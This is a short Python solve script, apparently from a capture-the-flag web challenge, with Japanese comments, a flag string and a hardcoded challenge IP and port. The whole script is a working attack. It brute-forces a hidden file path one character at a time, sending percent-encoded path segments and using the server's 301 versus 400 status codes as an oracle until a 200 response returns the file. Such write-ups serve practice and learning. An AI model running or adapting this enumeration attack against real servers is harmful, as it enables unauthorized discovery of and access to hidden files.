#解けなかった
#Alpaca{alpacapacapacakoshitantan}

import os
import httpx

host = os.getenv("HOST", "34.170.146.252")
port = int(os.getenv("port", 34599))

base_url = f"http://{host}:{port}"

client = httpx.Client(base_url=base_url)

chars = "0123456789abcedf"+"flagtxt"

#正しい文字列を格納
known = []

while True:
    print(known)
    for c in chars:
        #"/".join(['%12','%14','%15']) => '/%12/%14/%15'
        #[2:] 16進数文字列の先頭0xを取り除く '0x41'=>'41'
        #zfill(2) 2桁に満たない場合はゼロで埋める '4'=>'04'
        path = "/".join(["%"+hex(ord(x))[2:].zfill(2) for x in known + [c]])
        res = client.get(path, follow_redirects=False)

        #ファイルが存在する=>301, 存在しない=>400
        if res.status_code == 200:
            #print(path)
            print(res.text)
            exit(0)
        if res.status_code == 301:
            known.append(c)
            break
        
    else:
        print("failed")
        exit(1)